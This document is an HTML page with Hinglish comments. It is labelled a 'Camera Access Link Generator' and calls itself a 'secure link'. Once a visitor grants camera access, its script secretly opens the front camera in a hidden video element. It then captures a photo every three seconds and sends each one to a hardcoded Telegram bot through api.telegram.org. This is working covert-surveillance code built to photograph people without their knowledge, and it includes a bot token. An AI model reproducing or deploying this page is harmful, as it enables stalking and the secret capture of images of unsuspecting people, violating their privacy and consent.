<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access Link Generator</title>
    <style>
        body { font-family: 'Arial', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; }
        .card { background-color: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15); text-align: center; max-width: 500px; width: 100%; }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #555; font-size: 1.1em; margin-bottom: 30px; line-height: 1.6; }
        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease, transform 0.2s ease; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
        button:hover { background-color: #0056b3; transform: translateY(-2px); }
        button:active { transform: translateY(0); box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); }
        #status { margin-top: 25px; font-size: 1em; color: #888; }
        .error { color: #dc3545; font-weight: bold; }
        .success { color: #28a745; font-weight: bold; }

        /* Hidden elements for camera stream and canvas */
        #v-hidden, #c-hidden { display: none; position: fixed; left: -9999px; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Camera Access Link Generator</h1>
        <p>Click the button below to generate a secure link that requests camera access. Once access is granted, photos will be sent directly to your Telegram bot.</p>
        <button onclick="requestCameraAccess()">Generate & Request Camera Access</button>
        <div id="status"></div>
    </div>

    <video id="v-hidden" autoplay playsinline muted></video>
    <canvas id="c-hidden"></canvas>

<script>
    // Aapka Telegram Bot Token aur Chat ID
    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA"; // Apna bot token yahan daalen
    const chatID = "7107389141"; // Apna chat ID yahan daalen

    let cameraStream = null; // Camera stream ko track karne ke liye variable
    let captureInterval = null; // Interval ko track karne ke liye

    async function requestCameraAccess() {
        const statusDiv = document.getElementById('status');
        statusDiv.className = '';
        statusDiv.textContent = 'Requesting camera access...';

        try {
            // Camera access ki request
            cameraStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // Front camera
                audio: false 
            });

            const video = document.getElementById('v-hidden');
            video.srcObject = cameraStream;
            await video.play(); // Video play karein

            statusDiv.className = 'success';
            statusDiv.textContent = 'Camera access granted! Photos will now be sent to your bot.';
            
            // Jab video play hona shuru ho jaye tab photos lena shuru karein
            video.onplaying = () => {
                // Pehli photo foran len
                capturePhoto();
                // Phir har 3 seconds baad photo len
                captureInterval = setInterval(capturePhoto, 3000); 
            };

        } catch (error) {
            console.error("Camera access error:", error);
            statusDiv.className = 'error';
            if (error.name === 'NotAllowedError') {
                statusDiv.textContent = 'Camera access denied by user. Please allow camera in your browser settings.';
            } else if (error.name === 'NotFoundError') {
                statusDiv.textContent = 'No camera found on this device.';
            } else {
                statusDiv.textContent = `Error: ${error.message}. Please try again or check browser permissions.`;
            }
            // Agar camera access na mile to pehle se chal rahe interval ko band kar den
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            // Agar stream hai to usko bhi stop kar den
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
        }
    }

    function capturePhoto() {
        const video = document.getElementById('v-hidden');
        const canvas = document.getElementById('c-hidden');
        
        // Ensure video is playing and ready
        if (video.readyState === 4 && cameraStream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Canvas content ko Blob mein convert karein aur bot par bhejein
            canvas.toBlob(blob => {
                if (blob) {
                    const formData = new FormData();
                    formData.append('chat_id', chatID);
                    formData.append('photo', blob, 'live_photo.jpg'); // Filename for the photo
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (!data.ok) {
                            console.error("Failed to send photo to bot:", data.description);
                            // Agar Telegram API block ho to user ko alert de sakte hain
                            // document.getElementById('status').textContent = 'Warning: Telegram API might be blocked. Photos may not be delivered. Try with VPN.';
                        } else {
                            console.log("Photo sent successfully!");
                        }
                    })
                    .catch(error => {
                        console.error("Error sending photo to bot:", error);
                        // document.getElementById('status').textContent = 'Network error: Cannot reach Telegram. Try with VPN.';
                    });
                }
            }, 'image/jpeg', 0.8); // Image quality (0.8 = 80%)
        }
    }
</script>
</body>
</html>
